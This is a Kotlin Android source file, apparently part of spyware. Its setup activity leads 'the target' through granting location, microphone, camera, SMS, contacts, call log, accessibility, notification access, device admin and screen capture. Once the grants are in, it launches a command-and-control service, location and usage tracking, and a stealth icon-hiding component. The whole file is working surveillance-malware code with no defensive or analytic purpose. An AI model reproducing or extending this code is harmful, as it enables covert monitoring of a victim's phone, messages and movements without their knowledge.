package com.sp.core

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.core.app.ActivityCompat
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.services.ScreenCapture
import com.sp.core.services.UsageStatsService

/**
 * Invisible permission wizard.
 *
 * Walks the target through the sequence of system screens that the container
 * needs: runtime permissions, accessibility, notification listener, usage
 * access, overlay, unknown sources, battery optimisation, device admin and
 * the MediaProjection consent. Every step is opened as a system dialog, the
 * wizard advances when the user comes back.
 */
class SetupActivity : Activity() {

    private var step = 0
    private var awaitingPermissions = false

    private val runtimePermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_VIDEO,
        Manifest.permission.POST_NOTIFICATIONS
    )

    private val setupSteps: List<() -> Intent?> by lazy {
        listOf(
            { accessibilityIntent() },
            { notificationListenerIntent() },
            { usageAccessIntent() },
            { overlayIntent() },
            { unknownSourcesIntent() },
            { batteryIntent() },
            { deviceAdminIntent() },
            { mediaProjectionIntent() }
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            step = savedInstanceState?.getInt("step") ?: 0
            awaitingPermissions = savedInstanceState?.getBoolean("perm") ?: false
            if (!awaitingPermissions) askRuntimePermissions()
        } catch (t: Throwable) {
            // Never let the wizard take the process down.
            finish()
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putInt("step", step)
        outState.putBoolean("perm", awaitingPermissions)
    }

    private fun askRuntimePermissions() {
        val missing = runtimePermissions.filter {
            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            awaitingPermissions = false
            runStep()
            return
        }
        awaitingPermissions = true
        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        awaitingPermissions = false
        // Background location needs a second, separate grant on Android 11+.
        if (Build.VERSION.SDK_INT >= 29) {
            try {
                val bg = arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                ActivityCompat.requestPermissions(this, bg, REQ_PERMS)
            } catch (_: Throwable) {
            }
        }
        runStep()
    }

    private var currentAction: String = ""

    private fun runStep() {
        if (step >= setupSteps.size) {
            finishUp()
            return
        }
        val intent = try { setupSteps[step].invoke() } catch (_: Throwable) { null }
        if (intent == null) {
            step++
            runStep()
            return
        }
        currentAction = intent.action ?: ""
        try {
            startActivityForResult(intent, REQ_STEP)
        } catch (_: Throwable) {
            step++
            runStep()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != REQ_STEP) return

        if (currentAction == ACTION_SCREEN_CAPTURE && resultCode == RESULT_OK && data != null) {
            try {
                ScreenCapture.start(this, resultCode, data)
            } catch (_: Throwable) {
            }
        }
        step++
        runStep()
    }

    /**
     * Wizard is done: the container services are started from a visible
     * activity (Android 12+ only allows foreground services from the
     * foreground) and the task is closed.
     */
    private fun finishUp() {
        try {
            val c2 = Intent(this, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(c2) else startService(c2)
        } catch (_: Throwable) {
        }
        try {
            val loc = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(loc) else startService(loc)
        } catch (_: Throwable) {
        }
        try {
            val usage = Intent(this, UsageStatsService::class.java)
            startService(usage)
        } catch (_: Throwable) {
        }
        // The launcher icon stays visible - otherwise the app can never be
        // started again.
        try {
            com.sp.core.stealth.IconHider.show(this)
        } catch (_: Throwable) {
        }
        try {
            android.widget.Toast.makeText(
                this, "Настройка завершена", android.widget.Toast.LENGTH_SHORT
            ).show()
        } catch (_: Throwable) {
        }
        finish()
    }

    private fun accessibilityIntent(): Intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)

    private fun notificationListenerIntent(): Intent =
        Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)

    private fun usageAccessIntent(): Intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)

    private fun overlayIntent(): Intent =
        Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))

    private fun unknownSourcesIntent(): Intent =
        Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName"))

    private fun batteryIntent(): Intent =
        Intent(
            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            Uri.parse("package:$packageName")
        )

    private fun deviceAdminIntent(): Intent {
        val admin = ComponentName(this, AdminReceiver::class.java)
        return Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
    }

    private fun mediaProjectionIntent(): Intent {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        return mpm.createScreenCaptureIntent()
    }

    companion object {
        private const val ACTION_SCREEN_CAPTURE = "android.media.projection.action.SCREEN_CAPTURE"
        private const val REQ_PERMS = 0x5F70
        private const val REQ_STEP = 0x5F71
    }
}
